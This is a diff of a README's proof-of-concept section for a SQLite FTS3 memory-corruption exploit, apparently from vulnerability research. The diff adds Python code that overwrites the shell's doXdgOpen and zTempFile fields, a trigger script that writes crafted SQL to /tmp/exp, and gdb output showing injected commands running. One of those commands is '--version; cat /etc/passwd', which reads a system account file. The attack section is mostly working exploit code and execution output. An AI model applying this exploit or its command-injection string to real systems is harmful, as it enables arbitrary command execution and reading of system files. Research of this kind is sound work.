@@ -90,47 +90,133 @@ make
 
 #### 3. Proof-of-Concept (PoC)
 
-We exploit the vulnerability twice to corrupt `p->doXdgOpen` and `p->zTempFile` respectively. We disabled ASLR in this attack, so the address of `p` and faked structures are fixed. Bypassing ASLR is also feasible as demonstrated in page 60 of the slide. The complete PoC can be found in [doXdgOpen-poc.py](./doXdgOpen-poc.py).
+We exploit the vulnerability twice to corrupt both `p->doXdgOpen` and `p->zTempFile` respectively. We disabled ASLR in this attack, so the address of `p` and faked structures are fixed. The complete PoC can be found in [doXdgOpen-poc.py](./doXdgOpen-poc.py).
 
-```bash
-# Corrupt p->doXdgOpen to 1
+Here are a few key steps among this attack
 
-# set zMalloc (dest of memcpy) in sqlite3_value
-exp = writeVal(exp, sqlite3_value_off + 0x40, doXdgOpen, 8)
+**(1) Corrupt `p->doXdgOpen` to 1**
 
-# add a src string to test
-exp = writeVal(exp, src_off, 0x1, 1)
+```py
+addr_ShellState = 0x7fffffffcf68		# get this address via GDB
+offset_doXdgOpen_ShellState = 0xe
+
+dst_ptr = addr_ShellState + offset_doXdgOpen_ShellState
+bad_val = 0x1
+
+# sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)
+offset_sqlite3_value_zMalloc = 0x28
+raddr_sqlite3_value_zMalloc = raddr_sqlite3_value + offset_sqlite3_value_zMalloc
+zMalloc_val = dst_ptr
+exp = writeVal(exp, raddr_sqlite3_value_zMalloc, zMalloc_val)
+
+# malicious_content = Your-bad-value
+exp = writeVal(exp, raddr_malicious_content, bad_val)
 ```
 
-```bash
-# Corrupt p->zTempFile to ";touch hello"
+**(2) Corrupt `p->zTempFile` to `; ls`**
 
-# set zMalloc (dest of memcpy) in sqlite3_value
-exp_2 = writeVal(exp_2, sqlite3_value_off + 0x40, zTempFile, 8)
+```py
+addr_ShellState = 0x7fffffffcf68
+offset_doXdgOpen_ShellState = 0xe
+offset_zTempFile_ShellState = 0x98
 
-# add a src string ptr to test
-exp_2 = writeVal(exp_2, src_off, src_base_2 + 0x8, 8)
 
-# add a src string ";touch hello"
-exp_2 = writeVal(exp_2, src_off + 0x8, 0x6f6c6c6568206863756f743b, 13)
+base2 = base + 0x400
+dst_ptr = addr_ShellState + offset_zTempFile_ShellState
+
+# sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)
+offset_sqlite3_value_zMalloc = 0x28
+raddr_sqlite3_value_zMalloc = raddr_sqlite3_value + offset_sqlite3_value_zMalloc
+zMalloc_val = dst_ptr
+exp = writeVal(exp, raddr_sqlite3_value_zMalloc, zMalloc_val)
+
+# put "/bin/bash" after malicious content
+raddr_string = raddr_malicious_content + 0x10
+exp = writeStr(exp, raddr_string, "--version; cat /etc/passwd")
+
+# malicious_content = Your-bad-value
+exp = writeVal(exp, raddr_malicious_content, base + raddr_string)
+
 ```
+
+**(3) Trigger the bug twice**
+
+```py
+with open('/tmp/exp', 'w') as f:
+    f.write("create table t1(c1 char);\n")
+    f.write("insert into t1 values(x'" + exp + "');\n")
+    f.write("create virtual table a using fts3(b);\n")
+    f.write("insert into a values(x'" + valToLittleEndianHex(base, 8) + "');\n")
+    f.write("select optimize(b) from a;\n")
+    f.write("delete from a;\n")
+    f.write("insert into a values(x'" + valToLittleEndianHex(base + safe_space_offset, 8) + "');\n")
+    f.write("select optimize(b) from a;\n")
+    f.write("select sqlite_version();\n")
+```
+
+**(4) Attack**
 
 ```bash
 # clean up sqlite cache
 $ rm -rf ~/.sqlite*
 
-# We need to figure out the correct base address and shellstate address
+# Need to figure out the correct base address and shellstate address
+# Check the CVE link above to figure out how
 
-# generate the exploit poc
-$ ./poc.py
+# generate the exploit poc /tmp/exp
+$ python3 ./doXdgOpen-poc.py
 
 # exploit within gdb
 $ gdb ./sqlite3
-(gdb) b output_reset
-(gdb) r < /tmp/exp
+gdb-peda$ r < /tmp/exp
 
-# command `touch hello` will be executed and
-# we can find file "hello" in current folder.
+Starting program: /home/hong/sqlite-for-viper/sqlite3 < /tmp/exp
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Runtime error near line 5: bad parameter or other API misuse (21)
+Runtime error near line 8: bad parameter or other API misuse (21)
+3.40.1
+[Attaching after Thread 0x7ffff7dee740 (LWP 50258) vfork to child process 50261]
+[New inferior 2 (process 50261)]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[Detaching vfork parent process 50258 after child exec]
+[Inferior 1 (process 50258) detached]
+process 50261 is executing new program: /usr/bin/dash
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[Attaching after Thread 0x7ffff7fa1740 (LWP 50261) vfork to child process 50263]
+[New inferior 3 (process 50263)]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[Detaching vfork parent process 50261 after child exec]
+[Inferior 2 (process 50261) detached]
+process 50263 is executing new program: /usr/bin/dash
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+xdg-open 1.1.3
+[Inferior 3 (process 50263) exited normally]
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+aclocal.m4        ext            lempar.c            manifest.uuid  peda-session-cat.txt        sqlite3           sqlite.pc.in
+art               fts5.c         libsqlite3.la       mkkeywordhash  peda-session-dash.txt       sqlite3.1         src
+autoconf          fts5.h         libtool             mkso.sh        peda-session-dbus-send.txt  sqlite3.c         test
+config.guess      fts5parse.c    LICENSE.md          mksourceid     peda-session-groups.txt     sqlite3ext.h      tool
+config.log        fts5parse.h    ltmain.sh           mptest         peda-session-ls.txt         sqlite3.h         tsrc
+config.status     fts5parse.out  magic.txt           opcodes.c      peda-session-sqlite3.txt    sqlite3.lo        VERSION
+config.sub        fts5parse.sql  main.mk             opcodes.h      peda-session-vim.nox.txt    sqlite3.o         vsixtest
+configure         fts5parse.y    Makefile            parse.c        poc.py                      sqlite3.pc
+configure.ac      input          Makefile.in         parse.h        poc-simple.py               sqlite3.pc.in
+contrib           install-sh     Makefile.linux-gcc  parse.out      README.md                   sqlite3session.h
+doc               keywordhash.h  Makefile.msc        parse.sql      shell.c                     sqlite_cfg.h
+doXdgOpen-poc.py  lemon          manifest            parse.y        spec.template               sqlite_cfg.h.in
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
+Use 'set logging enabled off'.
+
+Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
+Use 'set logging enabled on'.
 ```
 
 ## Tips
